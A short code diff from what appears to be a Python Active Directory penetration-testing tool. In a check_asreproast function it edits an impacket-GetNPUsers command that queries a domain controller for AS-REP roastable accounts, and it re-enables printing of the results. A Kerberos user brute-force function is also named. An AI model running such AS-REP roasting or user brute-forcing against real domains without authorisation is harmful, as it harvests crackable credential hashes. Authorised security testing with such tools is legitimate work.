@@ -154,7 +154,7 @@ def check_asreproast(target, domain, user='Guest', passw=''):
         filename = 'smb_users.txt'
         if not (os.path.exists(filename)): return
 
-        cmd = f'impacket-GetNPUsers -no-pass {domain}/john.doe -dc-ip {target} -usersfile {filename}'
+        cmd = f'impacket-GetNPUsers -no-pass {domain}/guest -dc-ip {target} -usersfile {filename}'
     # Creds
     cmd = f'impacket-GetNPUsers {domain}/{user}:{passw} -dc-ip {target}'
     
@@ -164,10 +164,10 @@ def check_asreproast(target, domain, user='Guest', passw=''):
         printc(f'[-] {e}', RED)
 
     if output:
-        """ printc('[+] ASREPRoastable accounts founded.', GREEN)
+        printc('[+] ASREPRoastable accounts founded.', GREEN)
         for line in output.splitlines():
             if (domain.upper() in line):
-                printc(f'[+] {line}', BLUE) """
+                printc(f'[+] {line}', BLUE)
 
 
 def bruteforce_kerberos_users(target, domain):
